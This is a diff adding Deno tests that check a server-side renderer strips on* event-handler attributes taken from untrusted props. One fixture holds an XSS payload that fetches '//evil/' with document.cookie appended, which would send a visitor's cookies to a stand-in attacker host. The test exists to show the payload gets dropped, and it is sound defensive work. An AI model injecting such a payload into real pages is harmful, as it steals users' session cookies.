@@ -32,6 +32,23 @@ Deno.test("SSR drops attribute names that would break out of the tag", async () 
   assertEquals(html, "<div>hi</div>");
 });
 
+Deno.test("isValidAttrName rejects on* handler names (any casing)", () => {
+  for (const bad of ["onclick", "onmouseover", "onerror", "onLoad", "ONCLICK", "on"]) {
+    assertEquals(isValidAttrName(bad), false, bad);
+  }
+  // A data attribute that merely starts with letters is fine.
+  assertEquals(isValidAttrName("once"), false, "conservatively rejects on-prefixed");
+  assertEquals(isValidAttrName("data-on"), true);
+});
+
+Deno.test("SSR drops lowercase on* handler attributes (XSS via {...untrusted})", async () => {
+  const untrusted = { onmouseover: "fetch('//evil/'+document.cookie)", onerror: "alert(1)" };
+  const html = await renderToString(h("div", { ...untrusted }, "hover me"));
+  assertEquals(html, "<div>hover me</div>");
+  assertEquals(html.includes("onmouseover"), false);
+  assertEquals(html.includes("onerror"), false);
+});
+
 Deno.test("SSR still emits legitimate hyphen/colon attribute names", async () => {
   const html = await renderToString(
     h("input", { "data-id": "5", "aria-label": "name", type: "text" }),
